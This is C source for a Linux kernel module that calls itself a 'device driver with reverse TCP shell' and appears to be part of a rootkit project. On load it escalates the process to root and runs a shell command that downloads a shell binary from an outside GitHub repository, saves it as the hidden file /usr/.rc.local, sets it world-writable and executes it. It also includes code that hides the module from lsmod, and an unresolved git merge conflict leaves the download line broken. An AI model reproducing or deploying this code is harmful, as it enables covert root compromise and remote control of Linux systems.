
#include "reverseTCP.h"
#define DEBUG 1

MODULE_LICENSE("GPL");            
MODULE_AUTHOR("Jorge Lima");    
MODULE_DESCRIPTION("device driver with reverse TCP shell");  
MODULE_VERSION("1.0");            

//file operations for driver
static struct file_operations reverseTCP_fops =
{
   .release = reverseTCP_release, 
};

//==============================
//=====> init function <========
//==============================
static int __init reverseTCP_init(void)
{
	//#ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: Initializing driver\n");
	//#endif

   //get major number
   major_number = register_chrdev(0, DEVICE_NAME, &reverseTCP_fops);
   if (major_number<0)
	{
		//#ifdef DEBUG
      printk(KERN_ALERT "reverseTCP: failed to register a major number\n");
		// #endif
      major_number = -1;
      return major_number;
   }
	// #ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: driver registered with major number %d\n", major_number);
	// #endif

   // Register device class
   reverseTCP_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(reverseTCP_class))
	{                
      unregister_chrdev(major_number, DEVICE_NAME);
		// #ifdef DEBUG
      printk(KERN_ALERT "reverseTCP: failed to register device class\n");
		// #endif
      return PTR_ERR(reverseTCP_class);          
   }
	// #ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: device class registered\n");
	// #endif

   // Register the device driver
   reverseTCP_device = device_create(reverseTCP_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
   if (IS_ERR(reverseTCP_device)){               
      class_destroy(reverseTCP_class);
      unregister_chrdev(major_number, DEVICE_NAME);
		// #ifdef DEBUG
      printk(KERN_ALERT "reverseTCP: failed to create the device\n");
		// #endif
      return PTR_ERR(reverseTCP_device);
   }
	// #ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: device class created correctly\n");
	printk(KERN_ALERT "reverseTCP: calling reverseTCP_connect\n");
	// #endif

/************************************************************************
*************************************************************************
*************************************************************************
	call this in init function
**************************************************************************
**************************************************************************/

	escale_priv();
	reverseTCP_connect();
	// #ifndef DEBUG
//	hide_lsmod();
	// #endif
//========================================================================
//========================================================================



	// #ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: no hickupp!!!!\n");
	// #endif

   return 0;
}


//=========================
//=====> exit device <=====
//=========================
static void __exit reverseTCP_exit(void)
{
   device_destroy(reverseTCP_class, MKDEV(major_number, 0));     
   class_unregister(reverseTCP_class);                          
   class_destroy(reverseTCP_class);                             
   unregister_chrdev(major_number, DEVICE_NAME);             
}

//============================
//=====> device release <=====
//============================
static int reverseTCP_release(struct inode *inodep, struct file *filep)
{
   return 0;
}


//=========================
//=====> reverse tcp <=====
//=========================
static int reverseTCP_connect(void)
{
	struct subprocess_info *sub_info;
	//download userland reverseshell
<<<<<<< HEAD
	static  char *argv[] = { "home/shell", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/raw/jlima020-patch-1/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
=======
	static  char *argv[] = { "/bin/sh", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/blob/version2/src/keylogger/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
>>>>>>> f1318fde5e6a5a1b1074dc87e94a58db3766bdc6
    static  char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    
	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL );
  	if (sub_info == NULL) return -ENOMEM; 	
  	return call_usermodehelper_exec( sub_info, UMH_NO_WAIT );
}

//=================================
//=====> priviledge escalation ====
//=================================
static int escale_priv(void)
{
	//elevate priviledges
	struct cred *new;
	new = prepare_creds();
    if (new != NULL) 
	{
          new->uid.val = new -> gid.val = 0;
          new->euid.val = new ->egid.val = 0;
          new->suid.val = new->sgid.val=0;
          new->fsuid.val = new->fsgid.val = 0;
          commit_creds(new);
		#ifdef DEBUG
		printk(KERN_ALERT "now you are root\n");
		#endif
	}
	return 0;
}


//=================================================
//=====> hide from lsmod ==========================
//=================================================
static int hide_lsmod(void)
{
	
      // hide module from lsmod / proc/modules
      list_del_init(&__this_module.list);
      kobject_del(&__this_module.mkobj.kobj);
      list_del(&__this_module.mkobj.kobj.entry);
	return 0;
 }

module_init(reverseTCP_init);
module_exit(reverseTCP_exit);
